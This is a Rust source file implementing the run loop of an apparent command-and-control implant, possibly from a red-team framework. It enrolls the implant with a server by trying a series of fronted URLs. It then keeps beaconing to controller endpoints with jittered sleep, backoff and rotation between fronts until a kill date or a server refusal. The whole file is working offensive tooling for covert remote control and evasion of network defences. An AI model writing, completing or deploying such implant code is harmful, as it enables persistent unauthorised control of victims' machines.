use std::sync::{Arc, Mutex};

use crate::enroll::{self, Enrollment};
use crate::handlers::Cadence;
use crate::profile::Profile;
use crate::session::{Attempt, Seal, Session};
use crate::transport::{carriage_for, contact_dial};

/// The run's end states, mapped to process exits.
pub enum Exit {
    /// The artifact's time fuse or the server's permanent answer: stop.
    Terminated(u8),
    /// Nothing answered the enrollment walk.
    NoFront,
}

/// One complete run: enroll once (walking the fronts), then hold contacts
/// against the beacon URLs the same fronts name, reconnecting and walking
/// on failure, until the kill date or a permanent refusal. The nonce floor,
/// the ledger, and the cadence live in the session and survive every
/// reconnect and walk step.
pub fn run(profile: &Profile) -> Exit {
    let keys = enroll::KeyPair::generate();

    // The enrollment walk (architecture.md Sec 8): a transport failure
    // walks to the next front (the credential is unspent against a server
    // that never answered); a definitive refusal ends the run.
    let fronts = profile.enroll_walk();
    let mut enrollment: Option<Enrollment> = None;
    let mut last_error = String::new();
    for url in &fronts {
        match enroll::enroll_any(url, profile, &keys) {
            Ok(done) => {
                enrollment = Some(done);
                break;
            }
            Err(cause)
                if cause.starts_with("enroll transport") || cause.starts_with("enroll read") =>
            {
                last_error = cause;
            }
            Err(refusal) => {
                crate::diag!("{refusal}");
                return Exit::Terminated(1);
            }
        }
    }
    let Some(enrollment) = enrollment else {
        crate::diag!("no enroll front answered ({last_error})");
        return Exit::NoFront;
    };
    crate::diag!(
        "enrolled {} into engagement {}",
        enrollment.implant_id,
        enrollment.engagement_id
    );

    let cadence: Cadence = Arc::new(Mutex::new((profile.sleep_seconds, profile.jitter_seconds)));
    let mut session = Session::new(
        enrollment.implant_id,
        &profile.verbs,
        cadence,
        enrollment.ca_chain,
        Seal::parse(&profile.envelope_key).filter(|_| profile.contact_envelope == "aesgcm"),
        profile.kill_date.clone(),
        profile.mode != "stream",
    );

    // Contacts never re-enroll: the artifact's identity is bound, and the
    // walk only crosses fronts. Each front on the enroll walk contributes
    // its contact dial; the carriage is built for the entry the walk points
    // at, so a failed contact advances to the next front's dial and a front
    // that returns is picked up again on the next wrap.
    let walk: Vec<String> = fronts.iter().map(|url| contact_dial(url)).collect();
    let mut index = 0usize;
    let mut failures = 0u32;
    let mut carriage = carriage_for(&walk[0], profile);
    loop {
        if session.kill_date_passed() || profile.kill_date_passed() {
            return Exit::Terminated(0);
        }
        match carriage.attempt(&mut session) {
            Ok(Attempt::Crossed) => failures = 0,
            Ok(Attempt::Refused) => {
                crate::diag!("the server refused the handshake; terminating");
                return Exit::Terminated(0);
            }
            Err(cause) => {
                crate::diag!("contact ended: {cause}");
                failures += 1;
                index = (index + 1) % walk.len();
                carriage = carriage_for(&walk[index], profile);
            }
        }
        session.backoff_sleep(failures);
    }
}
